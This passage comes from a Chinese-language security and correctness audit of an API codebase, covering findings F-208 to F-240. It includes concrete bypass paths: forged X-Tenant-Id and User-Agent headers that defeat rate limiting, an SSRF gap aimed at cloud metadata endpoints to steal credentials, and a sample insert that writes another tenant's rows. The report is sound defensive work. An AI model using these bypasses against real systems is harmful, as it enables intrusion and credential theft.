- **根因**：白名单匹配在连接计数之前，且 `User-Agent` 完全由客户端控制。
- **证据**：`:110-112` `if (isWhitelisted(ua)) return`；`:29-37` 白名单常量。
- **影响面**：可绕过连接数限制发起大量慢连接/并发请求。
- **建议修法**：白名单不作为放行条件（仅跳过静态检查）；按 IP/令牌做真实连接计数。
- **是否当场可修**：是。

### F-209 分布式限流租户桶键取自客户端 `x-tenant-id`，可随意切换桶绕过限流

- **严重度**：P2
- **文件与行号**：`apps/api/src/plugins/distributed-rate-limit.ts:93-94,136-143`；`apps/api/src/plugins/tenant.ts:26-31,106-118`；`apps/api/src/routes/ai-user-model-chat.ts:429-440`
- **触发路径**：请求带任意 `X-Tenant-Id: <随机值>` → 每次落入不同桶 → 限流恒不触发。
- **根因**：桶键用原始请求头而非已验证的租户上下文；`tenant.ts` 亦直接采信该头。
- **证据**：`distributed-rate-limit.ts:93-94` `const tenant = request.headers['x-tenant-id'] ?? 'default'`；`:136-143` 拼入 key。
- **影响面**：限流可被轻易绕过（配合 F-01 之外的刷量面）。
- **建议修法**：桶键用已认证 `request.tenantId`（经成员校验）或退化为 `userId/ip`。
- **是否当场可修**：是。

### 第八轮 E：miniapp / edu 剩余

### F-210 学生自助签到接受任意 `date`，可补签/伪造全月考勤

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/edu-ai-management.ts:331-336,359-362,2003-2040`；`apps/api/src/routes/edu-ai-management-attendance-helpers.ts:317-376`（`:341-372`）
- **触发路径**：`POST /api/edu/attendance/check-in {"date":"2026-01-01"}`（学生身份），服务端按传入日期写入。
- **根因**：`date` 由客户端提供且无「仅今天/服务端时间」约束；查重与写入均按该日期，可循环写历史日期；并发无唯一约束保护。
- **证据**：`:2003-2040` 解析 `body.date` 后直接 `insert`；helpers `:341-372` 按 `date` 查重。
- **影响面**：考勤/奖学金/毕业资格数据可伪造。
- **建议修法**：日期由服务端按 `bizDayKey` 生成；仅允许当日；`(studentId,date)` 唯一索引 + `onConflictDoNothing`。
- **是否当场可修**：是。

### F-211 `/messages/rooms/:roomId/*` 忽略 `roomId`，返回全站消息并清空全部未读

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/miniapp-compat-routes.ts:2109-2143`
- **触发路径**：`GET /api/messages/rooms/{任意roomId}/messages` → 返回该用户（或全站）所有会话消息；`POST /api/messages/rooms/{roomId}/read` → 清空全部未读。
- **根因**：handler 解构 `roomId` 但查询/更新未使用，条件只按 userId（或无条件）。
- **证据**：`:2109-2143` `const { roomId } = params` 后查询无 `eq(roomId)`；已读更新同样无 roomId 条件。
- **影响面**：跨会话读取他人/其他房间消息；误清未读导致漏消息。
- **建议修法**：查询与已读更新加 `roomId` 条件，并校验成员资格。
- **是否当场可修**：是。

### F-212 通知偏好 PUT 的 `z.record` 无键数上限，配合 `Promise.all` 放大数据库往返

- **严重度**：P3
- **文件与行号**：`apps/api/src/routes/miniapp-compat-routes.ts:2731-2759`
- **触发路径**：`PUT /api/notifications/preferences`，body 为含数万键的对象。
- **根因**：`z.record(z.boolean())` 无 `.max()` 键数限制；handler 对每条执行 `await`/`Promise.all`，一次性产生 N 次 DB 往返。
- **证据**：`:2731-2759` `Object.entries(...).map(...)` + `Promise.all`。
- **影响面**：单请求打爆连接池/DB；内存放大。
- **建议修法**：`z.record` 后校验键数上限；改为单条批量 upsert。
- **是否当场可修**：是。

### F-213 `/learn/video/log` 无「记录不存在则插入」分支，首次观看进度静默丢失

- **严重度**：P3
- **文件与行号**：`apps/api/src/routes/miniapp-compat-routes.ts:533-573,176-182`
- **触发路径**：用户首次观看某视频即调用 `POST /api/learn/video/log`，无历史记录 → handler 仅 `update` → 0 行受影响，返回成功。
- **根因**：只有 UPDATE 分支，缺 INSERT/upsert；未检查 `rowCount`。
- **证据**：`:533-573` 仅 `db.update(...).where(...)`；`:176-182` 无插入。
- **影响面**：首次进度/时长丢失，学习统计偏低。
- **建议修法**：改 `insert ... onConflictDoUpdate`。
- **是否当场可修**：是。

### F-214 5 个家长端 `:childId` 端点缺 UUID 校验，畸形路径返回 500

- **严重度**：P3
- **文件与行号**：`apps/api/src/routes/edu-ai-management.ts:3013-3018,3062-3067,3094-3099,3138-3143,3233-3238`；对照 `:3192-3195`
- **触发路径**：`GET /api/edu/parent/children/not-a-uuid/...` → 直接进入 UUID 列比较 → PG `invalid input syntax for type uuid` → 500。
- **根因**：这些端点未用参数 schema；同类 `:3192-3195` 已使用 `childIdParamSchema`。
- **证据**：`:3013-3018` 等直接读取 `params.childId` 传入查询。
- **影响面**：错误 500 而非 400，日志噪声；可探测。
- **建议修法**：统一挂 `childIdParamSchema`。
- **是否当场可修**：是。

## 十三、第九轮新增（utils / plugins / services 运营财务 / services relay 基础设施 / db 剩余）

> 本轮 5 路并行，共 37 条。已复核关键 P1：`ssrf-guard.ts:207` 的 `fb` 笔误、`payment-idempotency.ts:138-142` Redis 故障返回 `processing`、`oauth-queries.ts:149-151` 无 `is_used=false` 条件、`usercenter-queries.ts:45-49` 全列 select、`settlement-service.ts:166-186` 忽略 `period`、`reconciliation-service.ts:143` 不传 `fromStatus`、`terminal-service.ts:476-503` 无 `sessions.delete`。

### 第九轮 A：utils 安全与数据一致性

### F-215 `isBlockedTargetIp` 漏拦 CGNAT 与 IPv6 ULA（`fb` 笔误），relay 放行档可命中云元数据

- **严重度**：P1
- **文件与行号**：`apps/api/src/utils/ssrf-guard.ts:192-217`（`:201,:207`）；`apps/api/src/utils/relay-egress-guard.ts:33,47,100`
- **触发路径**：relay 转发链路 `assertRelayEgressSafe(url)` → `assertSafeFetchUrl(url, RELAY_EGRESS_GUARD)`（`allowPrivate:true`）→ 只过 `isBlockedTargetIp`；目标 `http://100.100.100.200/latest/meta-data/`（阿里云元数据，CGNAT 段）或 `http://[fd00:ec2::254]/`（AWS IPv6 元数据，ULA）。
- **根因**：IPv4 分支只拦 `0/127/169.254`，不拦 `100.64.0.0/10`；IPv6 分支写成 `lower.startsWith('fb')`，应为 `fc`/`fd`（ULA 是 `fc00::/7`）。
- **证据**：`:201` `if (a === 169 && b === 254) return true`；`:207` `if (lower.startsWith('fe8') || lower.startsWith('fb')) return true`；同文件 `isPrivateOrReservedIp` 已含 `100.64/10` 与 `fc/fd` 判据，但放行档不调用它。
- **影响面**：能配置/篡改渠道上游 base_url 的一侧可让 API 进程请求云 metadata，窃取实例临时凭据；默认档（`allowPrivate:false`）不受影响。
- **建议修法**：`isBlockedTargetIp` 复用 `isPrivateOrReservedIp` 的 CGNAT/ULA 判据，修正 `fb` 笔误；对 metadata 域名/IP 加常量黑名单。
- **是否当场可修**：是。

### F-216 `hasOwnerPredicate` 用「SQL 文本含列名 + 参数含自己 ID」判定归属，insert/upsert 可写他人归属行

- **严重度**：P1
- **文件与行号**：`apps/api/src/utils/scoped-guard.ts:588-622`（`:588-590,:593-599,:615-622`）
- **触发路径**：任一 `dataClass:'scoped-write'` 能力经 `dbScoped()`（如 `db/content-generation-queries.ts:25`）→ `enforceDbAccessForPreparedQuery` → `hasOwnerPredicate`。
- **根因**：判据只看「SQL 文本任意位置出现 owner 列名」+「参数数组任意位置出现主体 ID」，既不校验归属列的值等于主体，也不看谓词结构；`insert ... on conflict do update` 被判为 insert 时**不要求 WHERE**。
- **证据**：`bindsSubject` 为 `params.some(p => p === subjectId)`；`referencesOwnerColumn` 为 `sqlText.includes('"'+column+'"')`；`if (kind !== 'insert' && !/\bwhere\b/i.test(sqlText)) return false`。
- **影响面**：scoped 能力是 RLS 停用后的最后一道数据闸；误判即跨租户读写。可复现：`insert into "notes" ("user_id","body") values ($1,$2)` 参数为 `['受害者ID','自己的ID']`。
- **建议修法**：insert 校验 owner 列在列清单中的位置对应参数值 === subjectId；select/update/delete 要求 `"<owner>" = $n` 且值为 subjectId，并拒绝语句级 `or`。
- **是否当场可修**：否（需改判据模型；可先加 insert 位置校验 + 禁 `or` 止血）。

### F-217 outbox 无原子认领：多实例并发重复投递，`attempts` 丢更新

- **严重度**：P2
- **文件与行号**：`apps/api/src/utils/outbox.ts:98-131`；`apps/api/src/plugins/scheduler.ts:355,368,415`
- **触发路径**：N 个实例 `onReady` 扫描 + BullMQ 周期任务同时执行 `processOutbox`。
- **根因**：取任务无 `FOR UPDATE SKIP LOCKED`、无 `pending → processing` 条件更新；完成后仅按 `id` 更新，且 `attempts` 用读到的快照 +1。
- **证据**：`select().from(outboxEvents).where(eq(status,'pending')).limit(batchSize)` 后直接 `dispatch`，再 `set({ status:'processed', attempts: event.attempts + 1 }).where(eq(id))`。
- **影响面**：当前 dispatcher 仅写日志则表现为重复审计行与计数虚高；接入 MQ/通知后即真实重复副作用；`attempts` 丢失可致事件永不到 `failed` 阈值。
- **建议修法**：单语句认领 `UPDATE ... SET status='processing', locked_by=$1, locked_until=$2 WHERE id IN (SELECT ... FOR UPDATE SKIP LOCKED) RETURNING *`；完成时带 `locked_by` 条件，`attempts = attempts + 1`。
- **是否当场可修**：是。

### F-218 `getKey()` 无 KDF、按字符截断且不校验字节长度

- **严重度**：P2
- **文件与行号**：`apps/api/src/utils/crypto.ts:9-17`
- **触发路径**：`encryptField/decryptField` 被 `relay-account-pool-service.ts:1053-1067`、`routes/auth-identity.ts:67,151` 等调用（渠道 token/refreshToken/cookies/身份证号）。
- **根因**：直接把 `CREDENTIALS_ENCRYPTION_KEY` 截前 32 个 UTF-16 字符当 256 位密钥，无 KDF；`key.length` 数字符不数字节，`Buffer.from` 按 UTF-8 编码，含多字节字符时 >32 字节 → `createCipheriv` 抛 `ERR_CRYPTO_INVALID_KEYLEN`。
- **证据**：`if (key.length < KEY_LENGTH) throw ...; return Buffer.from(key.slice(0, KEY_LENGTH))`，`KEY_LENGTH = 32`。
- **影响面**：口令型密钥可离线字典攻击；前 32 字符相同的两套环境密文可互解；含中文/emoji 的 32 字符配置导致加密读写 500。
- **建议修法**：约定 32 字节 base64 随机串并严格判字节长度；若要支持口令则 `scryptSync(key, 部署盐, 32)` 并带版本前缀。
- **是否当场可修**：部分（字节长度校验可立即加；KDF 切换需密钥版本兼容）。

### F-219 内存兜底计数器按插入序 FIFO 淘汰且不清过期键，Redis 故障期可挤掉他人仍在窗口内的短信配额

- **严重度**：P2
- **文件与行号**：`apps/api/src/utils/window-counter.ts:68-80,226-248`；消费点 `apps/api/src/utils/sms-send-captcha.ts:156`
- **触发路径**：Redis 不可达 → `localTryConsumeWindows/localIncr` → `localStore.size >= 20000` 时删除 Map 插入序首个 key。
- **根因**：过期条目只在该 key 再次命中时才被发现，无全局清扫；淘汰取「最早插入」而非「最早过期」，新 key 反而挤掉活跃窗口。
- **证据**：`if (localStore.size >= LOCAL_MAX_KEYS) { const oldest = localStore.keys().next().value; localStore.delete(oldest) }`。
- **影响面**：Redis 故障期用 2 万个不同手机号即可重置目标号码的日配额，继续发码（短信按条计费，资损）。
- **建议修法**：淘汰前先按 `windowStart + windowMs < now` 清理；仍满则 fail-closed 拒绝新 key 而非丢弃活跃窗口。
- **是否当场可修**：是。

### 第九轮 B：plugins

### F-220 支付幂等把 Redis 故障压成 `processing`，回调侧据此 ACK SUCCESS，已付款订单永不履约

- **严重度**：P1
- **文件与行号**：`apps/api/src/plugins/payment-idempotency.ts:138-142,148-168`；`apps/api/src/routes/payment-gateway.ts:714-718,1210-1212`
- **触发路径**：支付平台回调 → `acquire()` 时 Redis 不可用/超时 → 返回 `{status:'processing'}` → 路由按「已在处理」回 `SUCCESS/success`，平台停止重投。
- **根因**：`acquire()` 只有 `new|processing|completed` 三态，catch 分支把基础设施故障与他人处理中压成同一值；`complete()` 写失败只 warn 不上抛。
- **证据**：`:138-142` `catch (e) { ...; return { status:'processing', retryAfterMs: 5000 } }`；`:166-168` `catch (e) { server.log.warn(...) }`；`payment-gateway.ts:714-718` 对 `processing` 回 `SUCCESS`。
- **影响面**：Redis 抖动窗口内回调被 ack 成功而订单未履约，资金已收权益未发（需人工补单）。
- **建议修法**：增加第四态 `unknown`；回调侧对 `unknown` 返回 FAIL/500 触发平台重投，仅 `completed` 才 ack 成功。
- **是否当场可修**：是。

### F-221 RLS 上下文复位不绑定连接：池化下清不到持值连接，会话变量残值跨请求

- **严重度**：P2
- **文件与行号**：`apps/api/src/plugins/rls-context.ts:102-121,132-134,140-145,171-181,42-47`；池容量 `packages/database/src/client.ts:12`
- **触发路径**：请求 A 写入 `set_config('app.user_id', 甲, false)` → 响应结束 `releaseRequestContext()` 用另一条池连接执行清零 → 甲的值残留在原连接，被下一个请求继承。
- **根因**：写入与复位都是 `db.execute()` 从连接池任意借连接，无「同连接」约束（未用 `reserve()`/事务/`SET LOCAL`）。
- **证据**：`:111-116` 写入与 `:132-134` 复位均为独立 `execute`；`:140-145` `releaseRequestContext()` 不传连接句柄；`client.ts:12` `max: 40`。
- **影响面**：`app.user_id`/`app.current_user_role` 残值可被下个请求继承；当前 RLS 策略已被迁移删除故为潜伏型，但 `withRlsContext()` 与重启策略会踩中。
- **建议修法**：每请求固定一条 `sql.reserve()` 连接，set/clear 同一句柄；或事务内 `SET LOCAL` 随事务失效。
- **是否当场可修**：否（需改连接获取语义）。

### F-222 调度器在装配期 `await upsertJobScheduler`，Redis 不可用时启动永久挂死

- **严重度**：P2
- **文件与行号**：`apps/api/src/plugins/scheduler.ts:385-390,394-408`
- **触发路径**：`buildServer()` 注册 scheduler 插件 → 逐条 `await upsertJobScheduler`（29 个任务）时 Redis 未就绪/宕机。
- **根因**：`maxRetriesPerRequest: null` + 未关离线队列使 BullMQ 命令断连时挂起不 reject；插件体内 `await` 无超时、无 try/catch，`fp` 装配永不 resolve，HTTP 不 listen。
- **证据**：`:385-388` `const connection = { url: config.REDIS_URL, maxRetriesPerRequest: null }`；`:394-407` 循环 `await`。
- **影响面**：Redis 故障期滚动发布，新实例卡在启动，readiness 一直失败且无错误日志。
- **建议修法**：`Promise.race` 超时 + try/catch，或挪到 `onReady` 异步注册。
- **是否当场可修**：是。

### F-223 业务指标 `apiCallTotal` 标签取自未匹配路由的原始 URL，无基数上限

- **严重度**：P2
- **文件与行号**：`apps/api/src/plugins/business-metrics.ts:1844-1853,230-232,251-259`；对照 `:482-485`
- **触发路径**：`curl /api/<随机串>` → 无路由命中 → `request.routeOptions?.url ?? url` 取到原始路径 → 每次请求新增 5 个 Map 键。
- **根因**：`counterInc`/`observeHistogram` 是纯 Map.set，无系列数上限；同文件 AI/ihui 指标有 `AI_SERIES_CAP`/`IHUI_SERIES_CAP`，通用 HTTP 指标漏掉。
- **证据**：`:1845-1853` `const route = request.routeOptions?.url ?? url; const key = \`${route}|${reply.statusCode}\``；`:230-232` 无 cap。
- **影响面**：无成本内存增长，可拖垮 `/api/metrics` 渲染。
- **建议修法**：未匹配路由统一落 `'__unmatched__'`；或给通用指标加同源 cap + dropped 计数。
- **是否当场可修**：是。

### F-224 反自动化把可伪造 UA 当白名单前置返回，同时跳过扫描器判定、已有封禁与频率统计

- **严重度**：P2
- **文件与行号**：`apps/api/src/plugins/anti-automation.ts:84-93,136-138,241-245`
- **触发路径**：任意路径（含 `/.env`、`/wp-admin`）带 `User-Agent: monitor` 或含 `uptime` → `onRequest` 直接 return。
- **根因**：白名单（子串匹配 `monitor/uptime/prometheus` 等通用词）排在所有判定之前，判据是纯客户端头。
- **证据**：`:85-93` `HEALTH_UA_KEYWORDS`；`:136-138` `if (isHealthCheckUa(ua)) return`；后续 `isScannerPath/getBlockInfo/incrCounter` 全部不执行。
- **影响面**：反自动化整体失效，含已封禁 IP 仍可访问；与 F-208（连接数守卫 UA 白名单）不是同一处。
- **建议修法**：白名单仅豁免频率统计，不得豁免封禁与扫描器判定；去掉 `monitor/uptime` 通用词。
- **是否当场可修**：是。

### F-225 `cache-resilience` 的 `loaders` Map 只增不减，loader 闭包永久驻留

- **严重度**：P2
- **文件与行号**：`apps/api/src/plugins/cache-resilience.ts:236,399-404,323-331,253-255`
- **触发路径**：任意 `getOrLoad(key, ...)` 回源成功 → 写入 `loaders`；缓存按 TTL 过期后 `loaders` 无 TTL、无 LRU，只有显式 `invalidate` 才删。
- **根因**：`loaders` 被当长期注册表，注册点在一次性 `runLoad` 内，删除点仅 `invalidate`；预热失败分支不回清。
- **证据**：`:236` `const loaders = new Map()`；`:399-404` `loaders.set(key, loader)`；`:323-331` `invalidate` 才 `loaders.delete`。
- **影响面**：key 含用户/订单维度时 Map 随历史 key 单调增长，value 是捕获上下文的闭包，常驻内存并阻止回收。
- **建议修法**：loader 注册带 TTL 或与 `avalanche.tick()` 删除联动；加 max entries + LRU。
- **是否当场可修**：是。

### F-226 `/ws/relay/ops` 的 `error` 与 `close` 各 release 一次，连接上限被低估

- **严重度**：P3
- **文件与行号**：`apps/api/src/plugins/ws-relay-ops.ts:108-117`；`apps/api/src/plugins/ws-helpers.ts:114-127`
- **触发路径**：管理员连接发生错误 → `'error'` 回调 release，随后 WebSocket 规范保证的 `'close'` 再 release 一次。
- **根因**：`release()` 无幂等标记，两个事件都无条件递减。
- **证据**：`:108-117` 两个 handler 均 `limiter.release(userId)`。
- **影响面**：`maxPerUser=2` 形同虚设，每连接每 15s 触发一次重 DB 聚合快照，构成放大面。
- **建议修法**：`released` 布尔守卫，或只挂 `close`。
- **是否当场可修**：是。

### F-227 限流兜底存储每路由一个 20000 条 Map 且 FIFO 淘汰，Redis 故障期 IP 轮换即绕过

- **严重度**：P3
- **文件与行号**：`apps/api/src/plugins/rate-limit-failsafe-store.ts:86-92,94-118,130-138,206-210`
- **触发路径**：Redis 不可用 → `LocalFallbackStore`；攻击者轮换源 IP 访问同一路由。
- **根因**：兜底表按 ip 建键、每路由 `child()` 独立实例；超限时按插入序删最旧 1000 条，新 key 保留、他人计数被挤掉。
- **证据**：`:87-92` `cap=20000`；`:130-138` `for (const k of this.map.keys()) { delete(k); if (++n >= 1000) break }`；`:206-210` 每路由 `new FailSafeStoreImpl(...)`。
- **影响面**：Redis 故障窗口内单 IP 限流 fail-open，内存按「路由数 × 20000」放大。
- **建议修法**：全局共享 cap + LRU；增加每窗口全局上限。
- **是否当场可修**：是。

### 第九轮 C：services 运营 / 通知 / 财务

### F-228 智能体结算丢弃月度切分：每期都按整单价全额入账，且未支付即生成结算

- **严重度**：P1
- **文件与行号**：`apps/api/src/services/settlement-service.ts:166-186,198-229,240-255`；表结构 `packages/database/src/schema/agents-extended.ts:106-126`；调用点 `apps/api/src/routes/agent-extended.ts:606-620`
- **触发路径**：`POST /agent` 创建购买记录 → `syncAgentBuyToSettlement` → `createSettlementRecordsForRange` 按自然月切 N 期 → 每期用同一份 `options.amount = 整单价格` 写一行。
- **根因**：`agent_settlements` 表无 period/issueNo 列，`createSettlementRecord` 忽略入参 `period`；未按月摊分；在未支付的下单事务里即生成；幂等只按 `orderNo` 查一条，部分成功后整批跳过。
- **证据**：`:171-179` values 中无 period；`:249-252` `for (const period of periods) createSettlementRecords(agentId, period, options)`；表定义无周期列。
- **影响面**：365 天购买切 13 期 → `sum(amount)` 放大 13 倍，后台结算口径与应付金额全面失真；未支付订单进入应付统计。
- **建议修法**：表加 `period_start/period_end/issue_no`；按天数比例摊分；结算同步移到支付成功回调；幂等改 `(orderNo, issueNo)` 唯一索引。
- **是否当场可修**：部分（摊分/唯一键/时机可改；增列需迁移）。

### F-229 `chargeOneContractNow` 无占位竞态，用户连点即同一周期重复代扣

- **严重度**：P1
- **文件与行号**：`apps/api/src/services/subscription-service.ts:222-280`（对比批量路径 `:178-200` 已用条件 UPDATE 占位）
- **触发路径**：前端「立即扣款」连点两次 / 自动重试 → 两请求并发进入，均在 `deductRecurring` 前读到旧的 `lastChargeStatus`。
- **根因**：先 SELECT 判断再直接扣款，无「条件 UPDATE 抢占 pending」；收尾 update 无 status/outTradeNo 条件；非 SUCCESS 一律写 pending。
- **证据**：`:242-248` 仅读判断；`:258-266` 直接 `deductRecurring`；`:269-277` `update ... where(eq(id, contractId))`。
- **影响面**：同一计费周期重复扣款（资金损失 + 客诉）；`NOTPAY/CLOSED` 也被写成 pending 导致 1 小时内二次扣款。
- **建议修法**：与批量路径共用条件 UPDATE 抢占；收尾 update 加 `outTradeNo` 条件；终态按 `tradeState` 映射。
- **是否当场可修**：是。

### F-230 自动关单无条件写 `cancelled`，可把并发支付的订单改成已取消

- **严重度**：P1
- **文件与行号**：`apps/api/src/services/reconciliation-service.ts:127-148`（`:143`）；`apps/api/src/db/payment-queries.ts:113-134`
- **触发路径**：定时任务查过期 pending 单 → 调渠道关单（数百 ms~秒）→ 期间用户完成支付并回调置 paid → `updateOrderStatus(orderNo,'cancelled')` 覆盖为 cancelled。
- **根因**：`updateOrderStatus` 支持 `fromStatus` 条件但调用方不传；查单与改单间隔着外部调用；非 alipay/wechat 渠道连关单都不调直接取消。
- **证据**：`payment-queries.ts:128-134` `const conds=[eq(orderNo)]; if (fromStatus) conds.push(eq(status, fromStatus))`；`reconciliation-service.ts:143` `await updateOrderStatus(order.orderNo, 'cancelled')`。
- **影响面**：已支付订单被标取消 → 权益不发放或账实不符，对账长期差异。
- **建议修法**：传 `'pending'` 作 fromStatus，返回 undefined 即跳过；关渠道单失败不落库。
- **是否当场可修**：是。

### F-231 对账日界错位 8 小时：北京自然日账单 vs UTC 自然日本地查询

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/reconciliation-service.ts:35-37,56-64,80-85,275-283`；`apps/api/src/db/payment-queries.ts:160-167`
- **触发路径**：每日 03:00 `autoReconcileYesterday()` → 北京日 `YYYY-MM-DD` → 本地用 `${billDate}T00:00:00Z`~`T23:59:59Z` 查询。
- **根因**：远端账单按北京时间归档，本地以 UTC 日界取数，窗口错开 8 小时。
- **证据**：`:36` `formatDateByTemplate(new Date(nowMs - MS_PER_DAY), 'YYYY-MM-DD')`；`payment-queries.ts:161-166` `new Date(\`${billDate}T00:00:00Z\`)`。
- **影响面**：每天固定产生假差异，`slice(0,50)` 挤掉真实差异，对账告警失效。
- **建议修法**：本地取数改 UTC+8 日界，或 `(created_at AT TIME ZONE 'Asia/Shanghai')::date = $1`。
- **是否当场可修**：是。

### F-232 VIP 到期降级 `is_vip` 无条件覆盖 + 全量/N+1，续费用户可被误降级

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/vip-expire-service.ts:80-137`；续费写入口 `apps/api/src/db/vip-queries.ts:120`
- **触发路径**：每日 `vip-expire-daily` 执行期间用户续费 → 降级步骤「查不到 status=1 的 VIP 就 `users.isVip=0`」覆盖续费写入的 1。
- **根因**：两步不在事务、无锁、无 `is_vip` 条件；全表加载过期记录 + 每用户 1 查 1 改。
- **证据**：`:130-136` `const [activeVip] = await db.select()...; if (!activeVip) await db.update(users).set({ isVip: 0 }).where(eq(users.id, userId))`。
- **影响面**：刚续费用户被判普通用户 → 佣金等级、VIP 智能体、token 配额全部错判。
- **建议修法**：两条集合 SQL（`UPDATE user_vips ... RETURNING user_id`；`UPDATE users ... WHERE NOT EXISTS(...)`）同一事务，分批处理。
- **是否当场可修**：是。

### F-233 订阅窗口配额「查不到就放行」，副本延迟/DB 抖动即免费超用且用量记到旧订阅

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/subscription-window-service.ts:133-156,159-192,239-248,285-331`
- **触发路径**：每次中转调用前 `checkSubscriptionWindowQuota` → 读 `dbRead` 副本，`catch { return null }`；`sub===null` 即 `allowed:true`。
- **根因**：把「查询失败/副本延迟」与「确无订阅」合并；`getWindowUsageMap` 吞异常返回全 0；`consume...` 也用副本并吞异常返回 false。
- **证据**：`:152-155` `catch { return null }`；`:244-245` `if (!sub) return { allowed: true }`；`:329-331` `catch { return false }`。
- **影响面**：超额 token 不计费不阻断；刚续费用量落到旧订阅行导致双重超额；无任何错误日志。
- **建议修法**：配额判定与用量累计改读主库；区分无订阅与查询失败（失败 fail-closed）。
- **是否当场可修**：是。

### F-234 佣金兜底校准 `LIMIT 100` 无排序无时间下界，永不返佣订单永久占满窗口

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/commission-settle-service.ts:35-52,62-86`；`apps/api/src/services/commission-service.ts:119-124,143-172`
- **触发路径**：每日 `commission-settle-daily` → `calibrateCommissionSettlement()`。
- **根因**：条件为「已支付且无佣金流水」，而多数订单本就不会产生流水（无推荐人直接 return 0），这些订单永远满足 `NOT EXISTS`；`limit(100)` 无 `ORDER BY` 无时间下界。
- **证据**：`.where(and(eq(orders.status,'paid'), notExists(...))).limit(100)`；`createCommissionFlows` 中 `if (!proportion) return 0` / `if (parentUsers.length===0) return 0`。
- **影响面**：兜底机制静默失效，真实漏单永远进不了窗口；`missedOrders` 恒定 100 造成噪音。
- **建议修法**：加 `ORDER BY orders.created_at ASC` + 时间下界；或在 SQL 里 JOIN users 过滤 `parent_id IS NOT NULL`。
- **是否当场可修**：是。

### F-235 模板短信发送失败不退配额，一次通道故障烧光当日通知/营销额度

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/sms.ts:1009-1031,1035-1060,1062-1084,1086-1165`；对照验证码路径 `:275,285,300-301,328,333`
- **触发路径**：`sendTemplatedSms` → 先扣单号小时/日配额与营销全局日上限 → 全部通道返回 `sent:false`。
- **根因**：失败路径只 `recordSmsDelivery`，从不 `refundWindows`；并发去重命中返回 `success:true` 也不退。
- **证据**：`:1010` `tryConsumeWindows(...)`；`:1042` 营销全局扣减；`:1163-1165` `finally { inflightTemplatedBiz.delete(bizKey) }` 无 refund。
- **影响面**：通道短时故障即把用户当日通知额度扣光；营销 100 条全局日额度可被 100 次失败请求耗尽。
- **建议修法**：`delivery.sent === false` 时对本次已扣窗口 `refundWindows`；去重分支前置到扣减之前。
- **是否当场可修**：是。

### 第九轮 D：services relay / 供应商 / 基础设施

### F-236 终端会话自然退出后永不回收，5 次 `exit` 后该用户永久无法再开终端

- **严重度**：P1
- **文件与行号**：`apps/api/src/services/terminal-service.ts:476-503,526-528,888-920`；`apps/api/src/plugins/terminal-ws.ts:80-91`
- **触发路径**：用户输入 `exit`/SSH 断连 → `handlePtyExit` 只置 `status='exited'`，不 `sessions.delete`、不 `unregisterUserSession`；WS 只发 `exit` 后关闭。
- **根因**：退出清理与内存注销只写在 `closeSession()`（仅显式关闭/kill 才走）；`countUserSessions` 统计含 exited。
- **证据**：`:476-503` 全程无 delete/unregister；`:526-528` `if (countUserSessions(userId) >= MAX_SESSIONS_PER_USER) throw`；`terminal-ws.ts:80-91` 仅 `socket.close`。
- **影响面**：同一用户自然退出 5 次后永久报「超过最大并发终端数(5)」，只能重启恢复；会话与 PTY 引用无界累积。
- **建议修法**：`handlePtyExit` 末尾 delete + unregister；`countUserSessions` 只数 active；WS `onExit` 补 `closeSession`。
- **是否当场可修**：是。

### F-237 错误透传未命中规则时把上游原始错误原文回给调用方

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/relay-error-rules-service.ts:119,143,160`；调用点 `apps/api/src/routes/v1-public.ts:1285`
- **触发路径**：上游返回任意错误 → `resolveErrorPassthrough(502, raw)` → 无启用规则命中 → 返回 `message: raw`。
- **根因**：注释声明未命中返回通用文案，实现却 `raw || DEFAULT_MESSAGE`；`exposeUpstreamMessage` 仅命中分支生效。
- **证据**：`:143` `if (!matched) return { status: DEFAULT_STATUS, message: raw || DEFAULT_MESSAGE, ruleId: null }`；`:160` catch 同。
- **影响面**：上游错误文案含账号标识、组织 ID、request id、内部 URL，原样透给终端用户。
- **建议修法**：未命中与异常统一返回 `DEFAULT_MESSAGE`。
- **是否当场可修**：是。

### F-238 洞察服务查询不存在的列 `cost_used_total_cents`，两个维度永久静默失效

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/relay-insights-service.ts:92,96,211,244-252`；对照 `packages/database/src/schema/llm-call-logs.ts:83`
- **触发路径**：`GET /admin/relay/insights` → `detectCostAnomaly`/`detectFreeUsage` 原生 SQL → PG 42703 → 被逐维度 try/catch 吞成 warn。
- **根因**：误用 `developer_api_keys` 的累计列名查 `llm_call_logs`（只有 `cost_cents`）；`generateInsights` 单维度异常只记录不暴露。
- **证据**：`:96` `sum(cost_used_total_cents) AS daily_total`；`:211` `HAVING COALESCE(sum(cost_used_total_cents),0)=0`。
- **影响面**：成本异常与免费敞口两个核心洞察永久不产生；与 F-165 合计使成本侧监控整体致盲。
- **建议修法**：改 `sum(cost_cents)`；对 42703 类错误上报 degraded 维度。
- **是否当场可修**：是。

### F-239 对账批次级失败仍清 pending 账本，断链重推记录被抹掉

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/relay-account-pool-reconcile.ts:545-555`
- **触发路径**：`reconcileCheckinSync()` 推送批次遇 ai-service 500/网络错误/密钥缺失 → `pushPoolSync` 返回 `ok=false` 且 `failedIds=[]` → 整批落 pending 后同轮被 `clearCheckinSyncPending(okIds)` 清空。
- **根因**：清 pending 的成功集合只按 `push.failedIds` 反推，批次级失败时 `failedIds` 为空 → `okIds` 等于全量。
- **证据**：`:545-555` `if (!push.ok) { const pendingIds = push.failedIds.length>0 ? push.failedIds : payloads.map(...); await markCheckinSyncPending(...) }`，随后 `const okIds = payloads.filter(id => !push.failedIds.includes(id)); await clearCheckinSyncPending(okIds)`。
- **影响面**：批次级失败恰是最常见场景，pending 与 attempts 不留痕，`retryPendingCheckinSyncs` 与失败升级彻底失效。
- **建议修法**：`clearCheckinSyncPending` 只在 `push.ok===true` 时执行。
- **是否当场可修**：是。

### F-240 全局在途闸 `INCR` 成功但 `PEXPIRE` 失败时双计数并泄漏无 TTL 键

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/relay-account-shared-state.ts:302,342-353,368-374`
- **触发路径**：`incr` 成功 → `pexpire` 网络抖动抛错 → 同一 catch 继续走进程内 `globalInflightFallback += 1`。
- **根因**：INCR 与 PEXPIRE 非原子，异常当成 Redis 不可用直接降级，未回滚已成功的 INCR。
